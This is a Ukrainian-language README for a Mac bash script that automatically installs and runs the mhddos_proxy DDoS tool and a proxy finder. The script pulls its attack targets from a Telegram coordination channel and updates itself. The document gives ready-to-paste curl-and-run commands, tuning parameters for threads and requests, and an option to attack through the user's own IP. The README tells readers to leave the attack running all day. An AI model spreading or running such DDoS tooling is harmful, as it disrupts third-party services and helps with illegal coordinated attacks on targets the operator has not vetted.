# Опис auto_mhddos_mac

runner.sh - ПОВНІСТЮ АВТООНОВЛЮВАНИЙ (оновлює цілі та себе) bash-скрипт для Mac-машин, що керує [mhddos_proxy](https://github.com/porthole-ascend-cinnamon/mhddos_proxy) та [proxy_finder](https://github.com/porthole-ascend-cinnamon/proxy_finder)    
Також він автоматично оновлює не лише свій скрипт та цілі, а й сам скрипт mhddos_proxy та proxy_finder   
Також скрипт імітує роботу людини (вимикає увесь ДДоС на 1-2 (рандомно) хвилин), щоб дати машині трохи відпочити
Скрипт розподіляє ваші машини по цілям: https://github.com/alexnest-ua/targets/blob/main/targets_linux (цілі беруться звідси: https://t.me/ddos_separ)  
  
[**Варіант для Windows**](https://github.com/alexnest-ua/runner_for_windows)  
[**Варіант для Linux**](https://github.com/alexnest-ua/auto_mhddos_alexnest/tree/main)  
[**Варіант для Docker**](https://github.com/alexnest-ua/auto_mhddos_alexnest/tree/docker)   
[**Варіант для Android**](https://telegra.ph/mhddos-proxy-for-Android-with-Termux-03-31)   
  
можете запускати цей скрипт на увесь день та йти по своїм справам - він сам буде брати актуальні цілі  

**якщо запускаєте цей скрипт - інші атаки через Python не запускайте, бо при рестарті він вбиває усі процеси старі процеси з mhddos_proxy (щоб старі атаки не накопичувалися)**

Канал, де координуються цілі: https://t.me/ddos_separ (звідти і беруться сюди цілі, тому якщо у вас на Mac запущено цей скрипт - то можете відповчивати, він все зробить за вас)  
чат де ви можете задати свої питання: https://t.me/+8swDHSe_ROI5MmJi  
також можете писати мені в особисті у телеграм, я завжди усім відповідаю: @brainqdead
  
Туторіал по створенню автоматичних та автономних Linux-серверів: https://auto-ddos.notion.site/dd91326ed30140208383ffedd0f13e5c  

# Запуск скрипта
1) Заходимо в Launchpad, щоб відкрити термінал  
![image](https://user-images.githubusercontent.com/74729549/167318008-ec0e5caf-dc57-4d29-a352-8b41c49d4fe2.png)
2) Шукаємо terminal  
![image](https://user-images.githubusercontent.com/74729549/167318025-d7d89817-4e83-4118-8c35-fbf37e59fdea.png)
3) Запускаємо Термінал  
![image](https://user-images.githubusercontent.com/74729549/167318042-f892bec6-7a8b-4ad7-aed1-f625f2e92fd4.png)
4) Запускаємо скрипт, який сам встановить необхідні програми: Brew, Python, Git, доп. засоби Баш'у (можливо попросить ввести пароль для установки, 10 Гб вільного місця на диску та натиснути ENTER, щоб продовжити завантаження - тому слідкуйте уважно за виконанням скрипта при першому запуску), та після установки сам запустить mhddos_proxy та proxy_finder:
```shell
cd ~
curl -LO https://raw.githubusercontent.com/alexnest-ua/auto_mhddos_mac/main/runner.sh && bash runner.sh
```
    
* Буде запущено атаку з наступними параметрами за замовчуванням: threads=2000 rpc=1000 debug="" vpn=""(2000 потоків, 1000 запитів на проксі перед відправкою на ціль, без дебагу, без атаки через ваш ІР) та автоматично запустить паралельно наш [proxy_finder](https://github.com/porthole-ascend-cinnamon/proxy_finder)  
  
**Далі можна просто ЗГОРНУТИ вікно і воно буде працювати нескінченно в фоні**  
***щоб зупинити процес - натисніть Ctrl+C (або якщо не спрацює просто закрийте вікно з атакою)***  
  
Далі кожні 5 хвилин воно буде оновлювати список проксі, а кожні 20 хвилин - цілі атаки та перевіряти наявність оновлення (та встановлювати його якщо воно є)  
  
**!!!УВАГА!!!** runner.sh підтримує наступні параметри (САМЕ У ТАКОМУ ПОРЯДКУ ТА ЛИШЕ У ТАКІЙ КІЛЬКОСТІ(мінімум 2)), але можно і без них:  
curl -LO https://raw.githubusercontent.com/alexnest-ua/auto_mhddos_mac/main/runner.sh && bash runner.sh [threads] [rpc] [debug] [vpn]  
- threads - кількість потоків (але не менше 1000, та не більше 10000)
- rpc - кількість запитів на проксі перед відправкою на ціль (але не менше 1000, та не більше 3000)
- debug - можливість дебагу (якщо хочете бачити повний інфу по атаці - у 4-ий параметр додайте --debug)
- vpn - використання вашого ІР у атаці разом з проксі
  
* У всіх варіантах буде автоматично запущено паралельно наш [proxy_finder](https://github.com/porthole-ascend-cinnamon/proxy_finder)  
  

**ви можете змінювати параметри на будь-які інші значення, але я рекомендую саме ті, що за замовчуванням.**  
**також можете додавати **3-тим** параметром --debug, що слідкувати за ходом атаки, та **4-тим** параметром --vpn, щоб атакувати ще й через свій ІР разом з проксі**  
*наприклад команда з 1000 threads 1000 rpc дебагом та доп. атакою через ваш ІР*  
```shell
cd ~
curl -LO https://raw.githubusercontent.com/alexnest-ua/auto_mhddos_mac/main/runner.sh && bash runner.sh 2000 1000 --debug --vpn
```
* Приклад **БЕЗ** параметру --debug:  
![image](https://user-images.githubusercontent.com/74729549/168069087-1d1d641e-4ded-43b8-99e4-1d0688e3d2f0.png)  
***наступні 5 хвилин буде виводитись лише інформація від proxy_finder про пошук проксі, але атака теж йде паралельно!***  
* Приклад **З** параметрами --debug та --vpn:  
![image](https://user-images.githubusercontent.com/74729549/168068441-0be60ba6-49c7-41de-a89c-c50410a50fef.png)  
  
Далі кожні 5 хвилин воно буде оновлювати список проксі, а кожні 20 хвилин - цілі атаки та перевіряти наявність оновлення (та встановлювати його якщо воно є)  

